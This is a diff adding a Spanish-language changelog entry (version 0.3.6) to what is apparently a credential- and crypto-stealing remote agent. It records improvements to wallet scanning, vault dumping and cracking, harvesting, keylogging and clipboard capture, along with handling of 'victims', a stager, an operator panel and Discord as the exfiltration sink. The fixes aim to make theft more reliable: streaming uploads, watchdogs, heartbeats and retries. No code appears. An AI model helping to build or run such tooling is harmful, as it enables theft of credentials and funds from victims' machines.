@@ -1,5 +1,21 @@
 # Changelog
 
+## 0.3.6
+
+- El contenedor de artefactos deja de retener todos los ficheros en RAM: cada uno se copia a un temporal y el `.spc`/ZIP se construyen en streaming desde disco, con presupuesto por scan y borrado del temporal incluso al fallar. Un `scan_wallets` de 2.500 ficheros ya no debe disparar el OOM del host.
+- Un solo recolector pesado (`scan_wallets`, `dump_vault`, `crack_vault`, `harvest`); el resto usa un pool aparte y responde aunque el scan esté ocupado. Cola acotada con `busy: another collection is running`.
+- Deadline real por comando y watchdog que añade workers si los tres hilos se atascan. `ping`, `help`, `status`, `crypto` y `kill` no pasan por el pool.
+- Watchdog de gateway/REST: reconecta el cliente si el gateway cae o el poll no completa en 90 s y sale con código 21 tras tres recuperaciones fallidas.
+- Circuit breaker de la API (5 s conexión, 15 s lectura, dos intentos, 10 min abierto, una línea por estado). Un fallo de la API ya no bloquea el scan ni el heartbeat; Discord sigue siendo el sink.
+- `hello` en cada arranque, no solo la primera instalación, para que el panel reciba host, OS y versión.
+- El fallback de runtime copia también `jli.dll`, `jvm.dll` y el resto de `bin/`; el heap depende del perfil (`lite` 256 MiB, `full` 512 MiB).
+- Lock con PID y watchdog: un arranque nuevo mata al agente que no escribió heartbeat en 120 s.
+- Presencia por heartbeat real o `lastAgentMessageAt`; borrar una víctima enlazada no la resucita, el re-link es explícito y las tareas se rechazan con `422 discord_unlinked`/`discord_channel_missing`.
+- Agrupación de `password?`/`clipboard:` con contador y fallos de artefacto agrupados por nombre y víctima.
+- Job de retención (uploads, artefactos fallidos, huérfanos de Discord, keylogs, clipboard y eventos) documentado en `docs/KNOWN_ERRORS.md`.
+- La release verifica que el jar lleva `serverpackcore/config.json`, que el stager extrae `crypto-config.json` y que no reutiliza un tag existente.
+- Filtro por build, reasignación antes de borrar, avisos de `in_use` con enlace, confirmaciones de mutación y comparación de la versión del agente con la release.
+
 ## 0.3.5
 
 - El agente arranca con `-Xmx512m` y un máximo de dos hilos de CPU. El scan de wallets retenía los ficheros en memoria y con 96 MiB entraba en GC continuo hasta agotar la máquina.
